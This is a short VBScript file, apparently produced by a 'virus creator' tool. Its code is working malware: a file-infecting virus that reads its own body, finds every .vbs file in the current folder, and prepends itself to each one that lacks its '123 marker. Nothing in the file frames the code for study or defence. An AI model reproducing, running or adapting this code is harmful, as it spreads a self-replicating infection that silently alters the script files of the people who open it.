'123
'Created by dex with SIMPLE VBSCRIPT VIRUS CREATOR v2.0
Set PLMGGR = CreateObject("Scripting.FileSystemObject")
Set AQRPAJ = PLMGGR.OpenTextFile(Wscript.ScriptFullName, 1)
SRIVTB = AQRPAJ.Read(696)
Set UILQBN = PLMGGR.GetFolder(".").Files
For Each KGNOFG in UILQBN
SSMVUE = LCASE(PLMGGR.GetExtensionName(KGNOFG.path))
If SSMVUE = "vbs" then
 Set PVFLCV = PLMGGR.OpenTextFile(KGNOFG.path, 1)
 If PVFLCV.ReadLine <> "'123" then
  Set PVFLCV = Nothing
  Set PVFLCV = PLMGGR.OpenTextFile(KGNOFG.path, 1)
  GBGIGU = PVFLCV.ReadAll
  Set OAMCCR = PLMGGR.OpenTextFile(KGNOFG.path, 2, True)
  OAMCCR.WriteLine SRIVTB
  OAMCCR.WriteLine GBGIGU
  OAMCCR.Close
 End If
End If
Next
